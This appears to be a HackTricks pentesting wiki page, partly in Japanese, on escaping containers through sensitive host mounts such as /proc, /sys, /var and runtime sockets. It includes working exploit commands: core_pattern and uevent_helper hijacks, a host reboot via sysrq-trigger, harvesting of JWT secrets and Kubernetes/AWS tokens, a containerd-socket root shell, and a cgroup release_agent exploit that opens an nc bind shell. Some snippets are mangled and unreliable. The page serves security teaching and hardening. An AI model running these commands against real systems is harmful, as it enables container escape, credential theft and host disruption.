# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

`/proc`、`/sys`、および`/var`の適切な名前空間の分離なしでの露出は、攻撃面の拡大や情報漏洩を含む重大なセキュリティリスクを引き起こします。これらのディレクトリには、誤って構成されたり、無許可のユーザーによってアクセスされたりすると、コンテナの脱出、ホストの変更、またはさらなる攻撃を助ける情報を提供する可能性のある機密ファイルが含まれています。たとえば、`-v /proc:/host/proc`を誤ってマウントすると、そのパスベースの性質によりAppArmorの保護を回避し、`/host/proc`が無防備になります。

**各潜在的脆弱性の詳細は** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**で確認できます。**

## procfs Vulnerabilities

### `/proc/sys`

このディレクトリは、通常`sysctl(2)`を介してカーネル変数を変更するためのアクセスを許可し、いくつかの懸念されるサブディレクトリを含んでいます。

#### **`/proc/sys/kernel/core_pattern`**

- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html)で説明されています。
- このファイルに書き込むことができる場合、クラッシュが発生した後に実行されるプログラムやスクリプトへのパスの後にパイプ`|`を書き込むことが可能です。
- 攻撃者は、`mount`を実行してホスト内のコンテナへのパスを見つけ、そのパスをコンテナのファイルシステム内のバイナリに書き込むことができます。その後、プログラムをクラッシュさせてカーネルがコンテナの外でバイナリを実行するようにします。

- **テストと悪用の例**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
この投稿をチェックしてください [this post](https://pwning.systems/posts/escaping-containers-for-fun/) さらなる情報のために。

クラッシュする例のプログラム:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳述されています。
- カーネルモジュールをロードするために呼び出されるカーネルモジュールローダーへのパスを含みます。
- **アクセス確認の例**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # modprobeへのアクセスを確認
```

#### **`/proc/sys/vm/panic_on_oom`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で参照されています。
- OOM条件が発生したときにカーネルがパニックを起こすか、OOMキラーを呼び出すかを制御するグローバルフラグです。

#### **`/proc/sys/fs`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)に従い、ファイルシステムに関するオプションと情報を含みます。
- 書き込みアクセスはホストに対するさまざまなサービス拒否攻撃を可能にします。

#### **`/proc/sys/fs/binfmt_misc`**

- マジックナンバーに基づいて非ネイティブバイナリフォーマットのインタープリタを登録することを許可します。
- `/proc/sys/fs/binfmt_misc/register`が書き込み可能な場合、特権昇格やルートシェルアクセスにつながる可能性があります。
- 関連するエクスプロイトと説明:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- 詳細なチュートリアル: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### `/proc`内のその他

#### **`/proc/config.gz`**

- `CONFIG_IKCONFIG_PROC`が有効な場合、カーネル設定を明らかにする可能性があります。
- 実行中のカーネルの脆弱性を特定するために攻撃者にとって有用です。

#### **`/proc/sysrq-trigger`**

- Sysrqコマンドを呼び出すことを許可し、即座にシステム再起動やその他の重要なアクションを引き起こす可能性があります。
- **ホスト再起動の例**:

```bash
echo b > /proc/sysrq-trigger # ホストを再起動
```

#### **`/proc/kmsg`**

- カーネルリングバッファメッセージを公開します。
- カーネルエクスプロイト、アドレスリーク、機密システム情報の提供に役立ちます。

#### **`/proc/kallsyms`**

- カーネルがエクスポートしたシンボルとそのアドレスをリストします。
- KASLRを克服するためのカーネルエクスプロイト開発に不可欠です。
- アドレス情報は、`kptr_restrict`が`1`または`2`に設定されている場合に制限されます。
- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)の詳細。

#### **`/proc/[pid]/mem`**

- カーネルメモリデバイス`/dev/mem`とインターフェースします。
- 歴史的に特権昇格攻撃に対して脆弱です。
- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)の詳細。

#### **`/proc/kcore`**

- システムの物理メモリをELFコア形式で表します。
- 読み取りはホストシステムや他のコンテナのメモリ内容を漏洩させる可能性があります。
- 大きなファイルサイズは読み取りの問題やソフトウェアのクラッシュを引き起こす可能性があります。
- [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)の詳細な使用法。

#### **`/proc/kmem`**

- カーネル仮想メモリを表す`/dev/kmem`の代替インターフェースです。
- 読み取りと書き込みが可能で、したがってカーネルメモリの直接変更が可能です。

#### **`/proc/mem`**

- 物理メモリを表す`/dev/mem`の代替インターフェースです。
- 読み取りと書き込みが可能で、すべてのメモリの変更には仮想アドレスから物理アドレスへの解決が必要です。

#### **`/proc/sched_debug`**

- プロセススケジューリング情報を返し、PID名前空間の保護を回避します。
- プロセス名、ID、およびcgroup識別子を公開します。

#### **`/proc/[pid]/mountinfo`**

- プロセスのマウント名前空間内のマウントポイントに関する情報を提供します。
- コンテナの`rootfs`またはイメージの場所を公開します。

### `/sys`の脆弱性

#### **`/sys/kernel/uevent_helper`**

- カーネルデバイス`uevents`を処理するために使用されます。
- `/sys/kernel/uevent_helper`への書き込みは、`uevent`トリガー時に任意のスクリプトを実行する可能性があります。
- **エクスプロイトの例**:
```bash

#### Creates a payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Finds host path from OverlayFS mount for container

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Sets uevent_helper to malicious helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Triggers a uevent

echo change > /sys/class/mem/null/uevent

#### Reads the output

cat /output
```

#### **`/sys/class/thermal`**

- Controls temperature settings, potentially causing DoS attacks or physical damage.

#### **`/sys/kernel/vmcoreinfo`**

- Leaks kernel addresses, potentially compromising KASLR.

#### **`/sys/kernel/security`**

- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
- Access might enable a container to disable its MAC system.

#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**

- Exposes interfaces for interacting with EFI variables in NVRAM.
- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.

#### **`/sys/kernel/debug`**

- `debugfs` offers a "no rules" debugging interface to the kernel.
- History of security issues due to its unrestricted nature.

### `/var` Vulnerabilities

The host's **/var** folder contains container runtime sockets and the containers' filesystems.
If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
with root privileges. This can be abused to pivot between containers, to cause a denial of service, or to backdoor other
containers and applications that run in them.

#### Kubernetes

If a container like this is deployed with Kubernetes:

```yaml
apiVersion: v1  
kind: Pod  
metadata:  
  name: pod-mounts-var  
  labels:  
    app: pentest  
spec:  
  containers:  
  - name: pod-mounts-var-folder  
    image: alpine  
    volumeMounts:  
    - mountPath: /host-var  
      name: noderoot  
    command: [ "/bin/sh", "-c", "--" ]  
    args: [ "while true; do sleep 30; done;" ]  
  volumes:  
  - name: noderoot  
    hostPath:  
      path: /var
```

Inside the **pod-mounts-var-folder** container:

```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="ja"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index2.html
```

The XSS was achieved:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.

You can also replace configuration files, binaries, services, application files, and shell profiles to achieve automatic (or semi-automatic) RCE.

##### Access to cloud credentials

The container can read K8s serviceaccount tokens or AWS webidentity tokens
which allows the container to gain unauthorized access to K8s or cloud:

```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```

#### Docker

The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
the other containers' filesystems are available under a different base path:

```bash
$ docker info | grep -i 'docker root\|storage driver'
ストレージドライバー: overlay2
Dockerルートディレクトリ: /var/lib/docker
```

So the filesystems are under `/var/lib/docker/overlay2/`:

```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 1月  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d  
drwx--x---  4 root root  4096 1月 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496  
drwx--x---  4 root root  4096 1月  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f  
drwx--x---  4 root root  4096 1月  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2  
<SNIP>
```

#### Note

The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
locate the other containers' filesystems and SA / web identity tokens



### Other Sensitive Host Sockets and Directories (2023-2025)

Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. **Treat the following paths as highly sensitive and never expose them to untrusted workloads**:

```text
/ run/containerd/containerd.sock     # containerd CRI ソケット  
/ var/run/crio/crio.sock             # CRI-O ランタイムソケット  
/ run/podman/podman.sock             # Podman API (rootful または rootless)  
/ var/run/kubelet.sock               # Kubernetes ノード上の Kubelet API  
/ run/firecracker-containerd.sock    # Kata / Firecracker
```

Attack example abusing a mounted **containerd** socket:

```bash
# コンテナ内（ソケットは /host/run/containerd.sock にマウントされています）
ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /host/run/containerd.sock run --tty --privileged --mount \
type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/bash   # ホスト上でのフルルートシェル
```

A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.

Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:

```bash
# assuming the container has CAP_SYS_ADMIN and a vulnerable kernel
mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release

echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # requires CVE-2022-0492

echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
sh -c "echo 0 > /tmp/x/cgroup.procs"  # triggers the empty-cgroup event
```

When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.

### Mount-Related Escape CVEs (2023-2025)

* **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
runc ≤1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥25.0.3, containerd ≥1.7.14).

```Dockerfile
FROM scratch
WORKDIR /proc/self/fd/4   # 4 == "/" on the host leaked by the runtime
CMD ["/bin/sh"]
```

* **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.

### Hardening Reminders (2025)

1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
3. Keep the container runtime up-to-date (runc ≥1.1.12, BuildKit ≥0.12.5, containerd ≥1.7.14).
4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.

### References

- [runc CVE-2024-21626 advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
- [Unit 42 analysis of CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
